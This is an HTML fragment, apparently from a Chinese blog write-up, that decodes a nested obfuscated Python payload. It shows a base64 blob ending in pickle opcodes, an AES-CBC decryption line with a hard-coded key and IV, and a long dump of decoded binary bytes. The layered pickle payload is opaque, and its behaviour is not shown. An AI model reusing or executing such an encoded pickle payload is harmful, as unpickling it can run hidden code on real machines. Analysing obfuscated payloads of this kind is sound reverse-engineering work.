z79DnvuYp2iy4qeyji4uEMuMWynGZTZk6nxp6xb/4OjmrcY1FJw+RSmE+EKykD89KIfSoxdpLvj3rRab2032rVnlnQvLQ0GrUJ/U3VSQbTtdKUlG8jjPuQAEPhAHI2jTl63x8yl0tEXaRx8wwLSqb2M8ZiuDLO6RuXGC+F61t1MTpA9z7mCTRbqXPLZk/ITyRCnyI8kiZAWIKaodbRxqG1r/Av9V1+nbrlSiFxsmz6PLhSqgl2P/GE1656Lnenh+ufYU/9PBRw79xeFS9HLsVYyE7ikLiqOYGyuVFQhiqV6YSla6jD4HyhHVYrYeCpcuPlLKPGZk4Ao2j10RzDB483kAsd4T0QLCGuNcV/b2iKJ+9shtFJ4+hqc3IySLVwFOkiVShYH4qLmqzBgHHZ5gXtP8Q/6wWI0OE7HcHWCumQS6Zf5/PsV+oQOwGzbKF2sDWAQVt0AKDJlY3m/K/oFP1p+ly11dAJvwKieYdGvfhGt1jgqxqFPi/qZR+QH0/8QgK4n0Whj0ka7TcAcx/PwaQEUawCEhonV+CIkUKpRiIegCulHLF+CpEV7tK5v6lbAqKJC5nz/CiUciTBhgjDXgre/GSkeNdDUTw/UDYGSFRMKu0zjdVNKWGS9G5fU/luriSFV3y5wwsuMBqih6VH2JhLph7TriWWvQvYkiRjfjf6+L8+W8Wlyn9Cxg5VdQeRjQyihIkR9HJRg3GfpOXAo3Dzd04ZGLJFcPM64bebrBFW5iabWnDlkHOrPAvH8fSK/Rfx+arjpzkBHiqLD0n7GNZ1vta8lALkPIxUn0DZN35ZDdjL8fm3FHaf6snHKQzTAggtLxQ4FNzGVkZkYufYcXpYEHhuYx3L6jxtBw+TFP4XM+VrCS/kB93GKmnzawVS+WTu1O+fTAHxUc7Xcr83vEH7HXshLx3+2SoyDw7371V0nep8shDjopJF104s3rNJ0phKOUsa+09oSYXiN+X8q0xkWUAMdOr27Ul7fXAL+Syo1Bf3hhtbTzPIFq6Se9Nn5Qy9nc+XCtwHQR8yZvqSa+LVa6YIAxbc1Bku/HDiBJDo3Qyucfj5FGcVANEFVWYnQ8o4fFhjAvSSb7KDzM/9WYLmyU7LN6dCFDUk7Dn3AuEqWtlSvXKhbQffzCMHWJxHSBxJ+Vzz2wBLSJXyrRMnrrCTkZkQCBAmzuyPO1ihGVGMDiwQqLGGzqMUhYg9d392Et2r5938IhrnoAhS7ffH+zc/OzgpONwURKH7YYluveIv3/BPt3aOVvUAjHfxU1RjjTEQF5JXtOakJXi6gebdS0pMFGYQDtqcXWUHjNW4VfYoEhPXqHShy9R5eqhie3RN1d7+yK4cFktzyB76W02cxUaK+kPHhA2NC4E2PNIwNwgMa/7I8hoejUtWnJt3ZkiVnptUicjlfhhyYZOVAlOVs7iuPRB86Iq2Wh3xzF0Saed5u0HRZ+zELhuGotMrTN9DnjcMwzmfoIo/xe0HD3Z13PRbfRA7IdkFMn34xeWviRt+oLVcQRbwetz/fBJmGlzRVr2SXgpL550xX0axYeAvvWkwmrCwjel8UsTl/IX8gjfauMF3yAMPB6+Ed86nJMvgTs5SVcTaaRsN16BN7gfVGlTYV3/Wz0klgehgAAbfkEpsJlcB9VcHuEEY5oQDR7my11Nw&#x27;)%4))).rstrip(b&#x27;\\0&#x27;)))\x94\x85\x94R\x94.</span><br></code></pre></td></tr></table></figure><p>此时正式进入了套娃</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">json.loads(base64.decodebytes(AES.new(<span class="hljs-string">b&#x27;0c6TYJwXPNbfRaW8D9jLtVSqO1nvZzo=&#x27;</span>,AES.MODE_CBC,<span class="hljs-string">b&#x27;9ZpA87xH3J1k5ylK&#x27;</span>).decrypt(base64.decodebytes(<span class="hljs-string">b&#x27;Foi</span><br></code></pre></td></tr></table></figure><p>可以看到，base64，aes，base64。</p><h3 id="base64-de-2"><a href="#base64-de-2" class="headerlink" title="base64_de"></a>base64_de</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;\x16\x88\xb7\x1de\x14\x8fr\xb3\xc8\xdeB\x92\xb4\xac\\\xad\x1b5A\xb7\x0b\xd6\xb6\xc4\x1e\xd3jv\xef\xbe\xbc`\x8e5\xd1y\xf0\x87\x96\x18\xf2/8\xf0\xd3\xb2\xac\xbe\xf7\xcc&#125;j&gt;\x16\x042\x1f&#123;8\xff\xdd\x99\x99\x95\x1b\x00\x9b~\x13\xf8&gt;E\xf2&gt;\xa6t\xd7i\x94\xe5\x92\x00\xfa|.\xdc;\xdd\xb9\xbcV\xac\xab\xb0\x11\x86\xdfu\xb0\x18\x85&#125;\x9e\x15\xa4\x0f\xca\x0f\xee\xa5\x82\xd3\xaap\xd4\xb0g\xa2\xceB\xdb\xbc@PY\xb2\x8b\x97`\x03\xe8\x8c\x81(\xae\xd0\x98\xc7\xc9\xef\xd5#\x91\xf1svV\xe2\xe5\xa8\x11\xff\x9b\x84&lt;\xdf\xc3\xe2\xbdI\xbbV\xc3L\x81sB`$\xa5\xb8\xe0\xa2\xa2\x8aJD\xbd\xf6n\xee\x0c6\xda\x12\xb5&amp;\x89\x9c\xe4x\xf4&lt;x\xec\x7f\xbdPQ&lt;\x83\xf2\xe3\xe28\x11\x83\x93\xca\xd1\xbc[#\xfc;I\xd0\xc3&amp;\xe5\xb5d!\xe4t41r\x1e\x1e\xd8Z4\x98lN\x0eK\x12\xe0f\x9b\xfa\x96v8\xa5\\\xc8\xb8\x031\xce\xac)\xe9\xb0oW\x1e\xf58\x95\x0f\x97\xbd\x8b,\xb7iX\xde\xdc\x0e3\x9f\x13\xbb-n\x9f&lt;1\xd0\x1f\x8e\xc2P=\xb0\xd5\xb5\x03A\xaf\x9c!j*[\x129)\x9fQ\xbf&quot;!/\x82\x8c\xb4\xe7\xe1\x0f\xb9J\x87\xbc\xb3\xe5&lt;\x97%\x1b\xb9&amp;B\x80\xeeA` R\x9a\x92&quot;\x10Gmn\x81\xc7(\xe5\x98$G:\xc4u\x87\xf5\xe0h\xeb2\xe69yl\xb2\x7fT~\xd0\x01\xf8\x95\x92\xfcz\xef\x16MiYd@\x14\x96zB\x9eM\x13\xa6\x15G\xa8\x96\x82\xa6\xf7r\xbb\xael\xe5\xce\xc5\x12\x1c\xact\x06G\x92\x08\x91\xd9\x1d6\x9aQ\xd4t\xeb\x10\xdd\xe5\x89-\xa2R\xc9\x8b&quot;\xc2\xdb\xe0\x03?\xef\xcf\xc8\xcaD\x8b8\xd1\xa5\xae6\xc1N\x08\x8f\xe0\xe9K\x9b\xe0&gt;\xbb\xe3\x9d\xa9\xc0\x19\xdf\x7f\xc7_\x1dS\x94\xb3n\x80\x83BZ\xde\x1ak\xc5g\xc6f\xea;x\x9e/!\x8f\&#x27;\xb9\xba\xf6\n\xd1\xdbv\xb6\t\x0e\xffl\xec-\x844\xea\xf5\x99\xe9\xc9\xbc\x98\x8aI\x18P9\xa6-@\xac-\xa5\xb0\xf7\xf4&#123;\xf6\x852\x10\x1c\x9b\tJ\xbdls\x1c\xc2*\xc7\x19~\x19\xcb\x16\x9d\xf3\xd8Ml\xcd\x95\xe3\xbf\x15\xa3R;\xe6\x1f\xd3\x06\xba*|o\xbbW\xc6\xb37\x8aM\xc2U\xbd\xf0&gt;\xb2M\xf7\x0c\xe8\xa9[I\xe1m\xdb\x8a8\x01\x15D\x18\xc6\x85\x14\x1d\x14Bn\xe4s]J0\xa8K\x7ft~o\xc9\xd1\xcf\xaf\xf3V\xacX\x81\xf28\\\n\xbd\xad\xf5\xea-\x11y\x96\xcdh&lt;]\xfe\xeb\xeaI\xda\x98\xde L&#125;^\xf8&#125;\x1b6\xda\xb6\xa6\x8b\xde\xc4\xb8\x85\xffJ \x0b\xa2\xadb--uac\xac\x96|\xbb\x95\x92\xb8\xe0\x16Jn\xfaX\x8c\x1a\x0c\xf8QH\x9e\xc5;,\xaf\xcf\xce\xe2\xe8\xbcOD\&#x27;\xa14gy\x17f\x94\x88\x0e\x9d\xaf\x0c^\xd9\x04\x7f~\xd6\xfa \xc2\x90\x94\x97I\x90\x8f\xa1\xca\r\xa8\xd9\xdb\x95\xfb&#123;\x94\xc2\x06*\x13!%\x16\xaf\x83L[S\xe8\xc8\x1d.T\xbb\x07\x11Z\x0c\x084\x00\xaf\xdb5l\r\x96\x12N\xa9\xdb\xf8\x8e\xf7\xcf\x99\x9c\xd9I\xa6$&gt;v1\xeee!l\xc47\xbf\xff\x9cTX\x99\xbf\xc8+\x17\xad\xf3;\xcd\x8d\xc3\x7f\x87rb\xea\xc4\xc1\xa8xp\x8f\x12\xb1_\x9c\x00\x9e\xe3\x16\xf7h\x19\xdf$\x06\x9d\x1e\x83\xfe\x0ee\xa5S*Iu&amp;\xb0\xa9M\xa3\xdb\xab`O|\xba\xa3\x16r\xca\xf8\xe7\r\x1dy\x9f\xbf\xb1\x9c\xa16\x94\xa4\x11\x01\x82t3\xeb\xb0o\x81\xe0:h[\x92N\xa6\xc7\xc3\x9c\x8aa\x0fjH\xd8\xc4\xe4\xac^\xc1i\x16\xab\xa8]~\xbe\x1f\xac+Ggi-D\xd5\xcfG\xe4\x84^\x84\xba\xef*\x96\xb69\xae\xd0Y\xd2u\x97\xc4\x1dlA.\x1e\xe4\xc25\x82\x85E\xce\x17\xa7\xc1\xbc\x85\xa4\xd6\x85Y\x0f\xf2&#125;\xba\xe8[&quot;\xb0?b,m\xc2\xab\xfb\x96\xe9\xa2\xe7\x89\xc0\xf2\x80R\xa9\xb6\x8f\x8e\x1e,(;\xa1#&#125;3e6\xd9\t\xa3\x15\xe9U\xeem\x9a\x16!\x03\n\xf9\x00ZCU\xd6I\x7f (\xd7\xc5\xc1\xaa[\xc9x\xe2\x8b\xe5\xb0%\x95\x16Dx\x80J7@\xa1\&#x27;\xc7\xd1\n\xfa\xbbKb:\xa6e\xd8\xf9\x18=@\xc2Su\nRp\xc7\xba\x14\x8c\x9ce\xf5\xe2\x96\xa74V\x99t\r\xba\xcb\xc6:\x91\xc8\x1f\x1c\xb4\x0f\x00\x88dcK\x81\x99x\x1f\xf1a\xdfB[u\xc4\x98A&amp;\xa0\x15\x15\x87B\xb2\xc6t\xbe\xcc\xd2\xef\x18\xdam\x82\xf0+\xb7\xca\x1c/.\x08\x85\x1cS\xf7\xb0\x97\xb9j\xe2\x14V\xc8\xe9v6\x90bK\xfa^\xabV\x00\xc4\x93s\x8dd|:\x88Sxr\&#x27;\xd8\xaf\xd5\xbe\xf1D\xd6\xd4&quot;\xc5\xc9B\x90\x87\xe061^J\x12\xb2\xb6[\xe0\xd8MK\xb3UV\xf5\&#x27;\xad\xac\x04\x8dy?j\x92\x14\xf8ONF\xf5\xf29&#125;\x19\x14\x07\x86\xf8\xd1&#125;\xb8*\xf0TL\x18\xbe\xbb\xd8s\x98\xe2DF\xff\x1f\x0c\\;\xf4&quot;\x1f\x01(\xab\xa3\xe8\x9fs\xe3\xc2\x98?\x80j\x9b\xf6\xa760P\xc4\x12\x7f\x8f\xc5\xf0p\x13\xa6\x07\xc91#~Bik\x85\xd8\xa5&gt;\xe4\\\xfa\xe3&lt;4\xf6\xf3p\xbb\xf3\xc5M\xa0\x1b\xab\xa95]`-\x8f\x93\x0b\xbey\xfef-\xd0\xed\xca~\xe4\x19b\x0f\xfb\xa4|\x8b#9\xca\x11\xe8\xcf\xce\xc6\x98\x87[\x96)8\xf5l\xb0\xc9A9c\x1b=\xad\xd1\xef\xe8\x0e\x9c(\x85\x94\xd3\xe1\xe0&lt;\xeb\x92\xb0z\x19\xa3\xc5-Y\xca\x18\xea\x07^\x8d\xf5^\xe4\x8e89\x82;\xc3\xec%\xb2\x8a\xb1J\x95\xf2\xa7\xb0\x0e\x0e\x95C\x8e\xf6g\xf6]&lt;\xd3\xd0\x85\x18G5\xeff&gt;\xed\xd6&gt;1J\xef\x81\x838~(;\xffY\xbaY\n\xc9\xf8C\x9d\x9ez\x12&#125;\xda^\x0e\xb0C\x88\xbd*krg\xa4v\x88\x06~\x9dI\xaa\xd7\x06x\x99\xb6\xe4K\x1b\xc1h~\xd7|\x85\xba\x8c\x88\xc9=\xc8\xa3/|7\xdb\xcf\x864\x1bz\xa5\xe5l\x84\x7fJ]fSc6\x9b&#125;&lt;J\x9c[\x0e\x0e\xae7\xf8\xf0z\xbeNK+y\xc5\xe1_*\xdc\xcb\xe8\xaf\xac`\t\x8d\xee\xf2\x03\xe5\x0e\xfc\xa1x:\xe4\x12\xdf\xd8_?Tr2WXv\xc3\x8aq\r\\\x93\xe5\xe0\x90\x1d\x9f\x19^\xa4\x1c\x19\xd8\xf9\x84\x07\xe5\xd2\xaa\xfci\x1f6\xd6\x98:)\xd5v\x7fh\x16\x0b\xdc\xd1\x1d\x8fP\xeb\xa3$\x11\xf8\x02\xc4\xe2\x99\x15\x99\x00H\x0cvm\xb6&quot;_\xe6\x1cqj\xfb\x88$\x8e5\x998\xe3\xc4\xa4&#123;\x7f\x10\xcc\x0c\x0c\xa2\xd8v\xd8\xed\x9f\xd1\x15+#\xfa\xb1\xfd\xc2*\n\x9b\xeeT\xdf\xa6jy\x08\xd7\xc9u\x87\x8b\x1f\xeb\x8a\xc2\xd4\xccT\xf4m\xf5\x83u\xcb\xd4\xf6&#125;\xa4\x05\xd9\x042\x9dW\xa6y\xc4\xcar*G\x07\xe7P\x89\xea]\xe9\x81\xb1\xd14\xdf\xd9\x0e\x85\x08\xf5\x0e\xac\xc6@\x0fh\x02~b&#125;\x17\r\x01EgNA\xbc\x18\x16w\x14\xdbg\xa0J`;\xa5\x02\xb8\xe3vT\x17\x82\xf2p\xe1/Nxb\xa6\xf3&gt;&lt;\xc4\x81\xe7J\x85\xc7&amp;\xc5\x93N\xe7\xfc\r\x8aI\x8b&quot;\xf1\xf9;\xb5\xcdp\x93a\xaev\xfd\xea\x1cq\xce\xff.=N@\xd2\xe4\xa7\xd1\x934H(*\x8bj^UN\xe0\x8e\x11&#125;\x14K\xc2\xe8\xc9[\xdbj&amp;\x07\x9c\xa5A\xbe\x99K\x8b\x88\x05q\x89\x04\xcd\xec\xc47\xee\xa6,\xaf\xe1\xbc\x02\xc4\xf4Q\xaf\xf2\x1a\x15g\xe3\xfeti\x00\xe5\xdb6\x8a\x0c*\xdd\x0b)\x8eR\x0e\xcd\x88CO\xc3\xe7[\x83\xad\x1b&#123;^\xbd\xf42|h\x8bS\x08J\xe0\xdd\x9d\xaa\xe9\x1d\xbb\xd3\xe4\xfc\x04\x103\xa2\x95u\xfc\x08\x8fL\x95\x8b\xb6\x12\x01/\x8b\x93\xd7\x96\x0e\x841\xee2\xb2]\x0f\xb7|;]L\xdb\xd7\xc7\x8d\xa5\xa8.\xfa\xabBmA\x1f\xb4\xf3+\xe6qT\x8eE\x03\xc1\x94\xcfc\xfa\xbc\xd1\xa7\x9be\xe9\xbd\xf4\xa4\x89\xf3L\xbc\xb8\x88\xc7\x02\x93\x88\\\xc9Q\xbc\x90-e\x1d\x9a\x94\x08\x91\x80\x8f\xbbj\xd1\xcc\xe31\xb2\xa4\x0cF&lt;\xf5\xbcb\xa0\xdc\xef\x1d\x02\x19\xe0\xec\x9a1\x1d?\x10@\x8c\x9c\xdf\x12c\xd4\x13Z\x94!t\x9a&amp;\x1f\xcb\x7f-\xa7\xc5\x95\x17\xeet.\xa9cV\x94\x14\xa6\x8c\xa7\xc0t\x14R\x90\x15\xbd\&#x27;\t\xe8\x85S\xb5\x81\x98E\x9c^\x12\xd3\xdc\xd2\xbf~?\x07\xd3\xdfS\x83\xd1E\x06y\xc3&#123;~*5\x80\x93\xb7-&quot;\\*\xc3\x1c\x81\xd0$\x15\xc3+\xfb|x\xaf\xaeG\x8ff\xf7\xdaL\xc5\x87Z\xfd\xc5r\xb4\xd4\x1a\xdfj\x80\xc8spH\x9a@\x04\xd0J\xdc.\xa9\xf7\x84\xc2\xe9P\xa7\x99\xab\x11\xb9&gt;\x95\xbd\xf6\x9c\xc06\xa7\xe2\xa5x\xc5\xc8\xea\xf3\x0e\x1e\x1e\xdc\xce\xd7|\xcd\x9d\xd7\x08\xcc\xe2\xdc\x1b\x14\xf3\xd1\xbc\t\xb3R\xe9+x\xf1\xda\x05\x8c\x07\xa1M\xac,&lt;\x84\x83\xe9C\xaa\xf1\x82h\xe0F\xe1K&#125;\x8a\x02\n\xd8f\x92\xef\xc2\xc4_&#125;\xe9p)E\xe6\x14\xa2\xb2\xa8p_\x1fA\xc7I\xee?\xa2\xd8\xdc\xe7\xa0w|6\xfd\xa1\xbf\xd70\xb5\x0e3\x04\x0eP\xc7\xd5\xad\x16\xe5ZNL/\xe7\xdf%`\xdf]&quot;\x13y\xad\xbb3\xd1^&amp;\xe2t\xeb&lt;=[.\x9c\xa2\x01\xe47P\x95\xad@\xd3\xc7\xa8\x90\x97\x19\x1eZ\x82H\xf4\xe5j8\x86X\xb4\xa2)\xdd\xc0\tm\xc2\xc0\xec\xa8\x8c&#123;)&quot;\x9f\x10&#125;\xf4\xdd\xb3\xe5=&#123;L\xf0\xe5\x82\xa5d\\v]t\xf2\xab2o\x91\xa5\xa3~\x9fT\xc6\xf2Y\xf3\xb7&#125;\xdb\xcb\xea|\xf2\xc7\xe4I\xa4X\x1a\xf1\xd6\xc1\rQ\x12\x98\x98\x0c\x0c\x1aO\xaa`U\x84\xa0\xe8;\xdb\xf7\xc2\\\x0e\xa4\xa8\xde&#125;\xdf\xb5f8u\xdf\x06@(c\xf8\xb3\xe0\xc4\xa2RmV\x0e\xc6\x87s\x81\xe3\&#x27;\x16\x08\xe7\xf5\xb7\x96\x06\xe5qR\xa3\x80C\xeev\xbdD\x11\x03\xf6]f\xe9\x0f\xdd\x87(\x88\xb5#\x15^\xae&amp;&#123;\x82?Lv\x04\xf6ox\xe4\xa8O\xd03_\xba\xbe\x1f1f\xb1\xa5\xd9G\&#x27;\x81z\xa5\x82^\xdaA\xf6\x1f\x96\xa7\xc4\x86\xfb\xe3E\x81\x99\x10#\xf4\xd5\xed\xe4l9\xca\xea9\xdbc\x1e\xdd\xdbY\x10\x14&gt;-Y\x80\xbd\x94\x08\xb6f\xd6;@K\xc5iI9p\xa7\x98\xf3\xe4KrZ\xf7\x12\xe7\x12\xc7a&gt;P0\xb5W|\x89\x81/\xf2\xcb\xdb%8SfB\xb6\x8998\x94CC\xca\xc9SLPi\xa8S\x86\xfe\xb4\xe2\xc1\xcb\x89\xba\xed1\x97\xc8\xd8\x9e&#123;\xfd\x84\xf56\xba\x92\x00\xe0\xe2\xbf\x15\x13\x1fsrei\x0f\xac\x9f-\x12\x89\x1b&gt;\x05\xa7\xe3(\x1f.\x80\xf1b.a\xe8\xb5\x80\xbe_A\x8b\xb0\x86\x0b\xff\xfeM\xfaI\xb2\xde\xdf\xbf\xe2\x0c\xea\xdekK\xc3\xd1R\xb3\xadi&lt;:\xc4\r\xc1\xcf+\x7f\xd8\x95\x97\xfa1\xbe\xec\x81T\xefo\xb0\xbe\xf9\x8c\x07\x88TS\xfb\xdb\xcb\xb4\x8d5\xcd\xe9\x90\x15&gt;\xd6\x1e\xc7\xa3\xdf8\xd0\xb1\x01\xdc\xa6\x9b\x9b&lt;\\v\x12\x80x#\x01&#125;!\xb0\x9e6z;?\xeb\xb6\xd8\x17\xca\xd06\xd6\xb2/Eri#]\xc4c\t\xbbJ\xa7\x07\x80\x0cK\x01\xb2\x8b\xde\xbchy\x0c\x96q7\xb3\x87\x0b\r\xc8\xfd\xcc&lt;n\xff\x0b*&amp;\xfe\xb4\xf5\xe0\xfb\xc3\xc0\xfe\xfa\x10E\xbedb\x83\xe9\x84\xc9\xedB\xeaZ\xf5\xdf\xc1\xb0\x9a\xdet\xc2\x13\x87v\xae\xf4\xec\x97\x91\xd4\xb6\x97l\xbd%\xc3\xd0N\x83\x92\xd3\x89J\xa0W.\xfd\xdc\x0e#\xe9QB\x00\xdb\x89\x89\x8d\x1c\xd3\xdf\xdf\x84\xb4\xacD+Y\xd6\xe60Jk\xf0\xf2\x01h\x11\x04\xba`\x19\x15\x13\x14\x9f\t\xd3\x9c\xe4i=\x9c\xc0m\xfd *\x18Q\x8d\&#x27;\xba\xc3j\xf8\x94\xdfe\x90\x18\xb9\x11\xbeB\n ;)\xdf\xf4\x17\xc5\xa1i\x80\x05(\x02\x87M\x95\xb5X\xd7&lt;\xd4|\xca\x8e\x958/\xa7\xfez\x93@|\xa3\x0242\n\x06\xf0\xc8\xef\xe0\xd8\x1cM\x96\x14\xad\x7f\x84\xc3\x16\x0e\x03P\x9b\xb0\xa0\x1d\xe8\x95:\x8f\x12_\x92\xc2t\x00\xfa\xa7\xa5\x9f\x86\xe5\x1f\xb0\x9b\x12 1\xf7\xe3\xac\x02\\)\xfd\xcf9\xbf\xcdv\x03\xc8\x10\x08\xd1T\xe29\xd4\xc2\x1e$G\xf2\x80\xf8\xbd\x0edU\xfe\xac\xa7;\xab;\xd7\xca\xd6\x05(H\xea\xc0+3J\x9c*\xd0\x87b\x9b\x18\xd5\x82-zk\x85\xad\x10uf? \xc6[\x05?\x13\x1e\x05Hc\xff&#125;M\xae\xc2\xbb3\x81\xbf*\x18\xcb\xf4\xe1\x92\xb0\xc1\x96B\xed\xc6\xdbB)\xdcN\x88\x00\xc4\xc7\x12\xa7\xef\xbb&quot;LL\xa8\x8f@M\xa3\x8fN\xd5&quot;\x8f.\xbe\x9c\x8c\xcd\xe0&lt;\x1c\x14\xd0RW\xa4\xbf|9\xdc\x86i\x14\x82FCA\x07\x91Sb\xb87~\xb6\xbb\x05\xedR\x9e\xd0\xd3^\xb2\x05$\xfc$T#$\x8f\x1cpd\xeb$\xee@\xfeS5uF\xf7\x05rz\xcd\xbe\x83\\[a\xe1\xdfV\xc5\x1f\xff\x99\xf3\xca\xe8Q\xf6\x9eoNHxu\xe2\xa1F\xc9R5\xcc\x9c\x86/7\xbe\xc1\xb4\xfc\xb2u\x1eR\xa6\xea\xf8\xf30z\xeb\xdb\xc9\x06,\x0c\x8a:A\x9a\xc44Q\xfa\xfc1\x8au\x0e\xe6\\E\xfb\x1e1iQ\xbf,\xdd;\xdd\xfaQ\xccf8^\x93\n\xcb\xd7l\xbd\xc2\xaa\x03\xf2fi\xab\x88\x1f,\xc3\xb9\x80\x97\xbd\x16;j\x0b\xb9]r\xe6Kb\x91Nh\xa4zo\x97ZY~\x88\xc2\x05u8\xe6\xc71\xf2\x99\xd9\xde\xad\x93\x89\xac\x8b)$\x8d\x97\x85\x95\xe1\xf8\xdat\x12\x0e\x81\xd7\xc9\xae\xc0]\xa8\x1b\xadg\xa9uE\xf5z\x1f\xe1-\xe4\xbc&amp;\xea$f\xea\xaayV\x9d\xaf\xdfT\x18--\xcf\x90\xd6(cYc\xba\x0b\x8a\xf4%\x98\xc4\xf3VRX@\xd1KL\x8eO;\xdb/\xb6\xa5\x95\xb5\x03Q\xa3~;\xef&amp;\x17\xecQI\xa9\xd6\xb4R\xad\x87\xf3\x03\xac\x84\\\x0e\xe2\xf9\x920u\xa0\xa4\x14r\xd5\xef\x96\x80\xde\xb9\x8f\xfd\xbam[\x83&lt;\x08\xb3H\xa3\xfb\xc8\x9eZ\xaf\xf0T-\xde\xfaf\xea\xf3k\xc3\xd1\xfb\x93\x185l\xdf\xbaoI\xdeo\xfbF`\xda\x92\xfa\xed6\xcf\xc0~\xb9\x88\x0f\xe5\xbf\x90\xacI\x01WJ\xdf\x0bL\x12*\xee\xe4vm/\x0c\x1f\xfc\xb5\xe9\xfc\x0ednp\x11\x8f\x97-MT\x0f\xf2\x0f&quot;\xaa#\xdd\x16\xd4V!Gs\\\x121\x96\xcf\x1d\xed\x7f*\xae\xca\xd5\x92\x1f&lt;\xd0Z\xe7\xefxms\xacRU\x08\xd0\xe4&gt;i\xf0\xbfq&gt;\xc9\x17Bm#\x94=P\x9a\x1a\xce\xd1\xb6Ux\xb5\x18\xdd\x1dz\xbe\x89\x85\xec\xa6^\xb5\x07\x8b\xe0a27\x8du&#125;|~\xb0\x12D)\x89\x8c\xde\xf4r\x0f(\x07\x9e\x0b\xb1\xfb\xc0\x81n\xcd\xcd%\x137\xd8\x9b\x94\x9d0\x8e$\xb8;\xfe\x02\xcc\x80\x97o6\xf9\xfcw\xbb\x8b\x89\x82\x9a%1K\xcb\x05\xfc\t\xa6\xd5\xa2\xb6\x9dd\x07\xbf\xbfI\x97$\x17\x1f\x04Y\x96\xbb\x96vb_\xc9\x9e\xb8\xaa\xccM\xe4\n\xd3C\xa0\x04\xacht\xb9\xefJ\xef\xcc\xf4=Mi\xa1\xf6\x85-\xa9%\xf2\&#x27;\xa2\xe3f\xad\x07\xaa\xd9\x82;\xf3\x00\x8fe\x0b\&#x27;8L\x00\xdb\x0e\x17\x94\xd1\x02\xac\xbd\x1e\xac\xb7\x0b\xed7\xf5\x0e\x9d\xe6\xec\x9eM\x8fp\x16\xff\x14\xcf\xd4\x0e\x9b\x7f\x02\xc8\x9c\xfd\xb9iZ\x93kvf\xcf\xbd\x80R\x1bE\xc0\xeew\xd4UJ\x84G\x04\xfd1x\x9b\xe9\x80\xf4\xdfh\xb0\x92\x05&lt;T\x84\t\xdf\xb9\xf9m\x86\x86\xe3\xedk\xd2\xdb\xeb\xa5\xbeD\xfe\xa9\x8c\xf5)\xbb\xe6&quot;\x06\xe7F\xcd\xbf\x1aesMHB\x9b)\n\xbfX\xcb\xbaG\x01\x01a\t(\xa9\xac\xf7G\xa5U\xfe\xb9$\x1cH\xf5x&amp;Z\x94\xc8\x18\xdd\xef\x94\xf8_p&amp;t97\x1a\xcc\xaf\xe2Sv\xc1=&#123;\xf5\xce\x1e\xb8Ya\xf8\xee\xb7R\xdf\x8c\x97\x105-B\xf5\xf5~^\t\xf8\xc0\xdb\x16\xef\x91\x01\xab\xf0\xfe\xdfO?Ud\xce.\xdf\x04\xb9/\x80\xbeW\xedw\xed\xd6\xde=\xfdme\x08#\x16\xd1_=\x93x\xcc\xfc\xac\xfd\x9c\x02\xe6\x9e[Ng\x89X\x91\xa5Z\x9c\xe7=\xfc\x8b\xc0\x9a\xf8\x19LVao\x80XF\xdf\xf0\xb2KD+\x85\xdc-D\x18\xb1\x90!F\xf8-[b+\nU\x97\x1c\xacsx\x7fX\x1ae1Y 8\xac#9\x93\xa4\xa1\xb68\x8d\xbf\x92t%?\x9e\xc8jRZ,\xf1\xbb\xe2\x84\xa3f\x90a\x1d\xfb,\x94m\xbfu\xb7\x86j\x86\x9bz\r\x00\xaf\x143\x80\xe4\xa1\n\xf4\x02P.\x9av\xd6H\xc2\xfc\x87\x0b\xdc\xbf&#125;.\&#x27;+\x08\xd0\xd9\xb3\xb7\xc2\xc1\xdbF\xdc\xe89\nh\xc4\xc9\xe1\x17\xcca\xac\xfb\x9c\x14\xd0=\x83\xfe4\xeb\x02\xc1\xe0\xef\x19\xa2\xd4u\x19\x04Z\xbb\xb7&amp;\x8a\x85u\x9b\xd6\xa0\xa8?\xe2\xbc\x11\xf8\x8b\xe5\x06mG\x89\x07\xc3.\xa3\xe3\xab\x94\&#x27;\x16&#123;U\xdc\xca\xb3\xca\xc22\xc35y\xdehE\xff\n\x17\x96\x93\xd8\xa7(\xba\x87\xfa8\x95\x99\xf4&amp;\xf9\x94\x84\xa2\x07R:\xedRN\x1b\x19\xd4as\xfd\x08&lt;\x9d\xf9\x0c\xd8\x06\xfc\x12w\x8b\x19\x0e\xb17\xe26\x8ad!1\x91\xd2\x84\xcbP\x99N\xf2\xed\xf9G.\xcd\x02&amp;\xceh\xeb\xa1\x89j\xc0\xfa\x11(\n\xe0\xcb\xe6G\x953\xcc\x9c\xbb\x14\xe4\xd5\x7f\t\x9dQ[\xc1\x88\xd6\xea\xc0\xf0 \x9e\x8dh\xff\xb4:\x0ci~\xc0\xd8T\xbaES\xc40\x82r\xa9\x7f\x93\x9ac\x14bW&gt;\xea]\xd9\x04\xc8\t\xaf\x06\xef\xb1\x12\xc1\x91j\x01\xb9\x07\tz\xcec\x03\xc5\xe1\x19\x8d\xd5&#125;q\x1f\x1f\xbc\xed\x12&quot;\xf4\x90\t\x9e\xe1/X\&#x27;uu\x05\xa8yU\x87\xcd\xfe8\xc7\x01\xee$\x04\xcd\x8cE=&gt;\xd3t\x17\x00+\xc7\xeeQ\x96\xdd\x85\x1e\xd9\t&quot;\n\r\xed\xdf\x96\xe2P\xf7s\x84TQezYVM\x05\xfd\x1a\xb4\xff\xc2V\xd2W&quot;sI\xa3\xa2\x1e%8.\xcc\x1c\x8b-\xde\x00.\xb1r\xf3\xc1\xf5\xc5Z\xdd\xcc\x1d\x9f\xa1\xc0~\xe4\x03\x033V\x81\x0e\x1cLs\x95|\xf7,Ry\xf7\x10\&#x27;5bV\x1a\xaf[B\x18\x94q\xf6p\xba\x9eM\xea\xc2\x13)Cqc\x1bAi\x93\x9d\x86 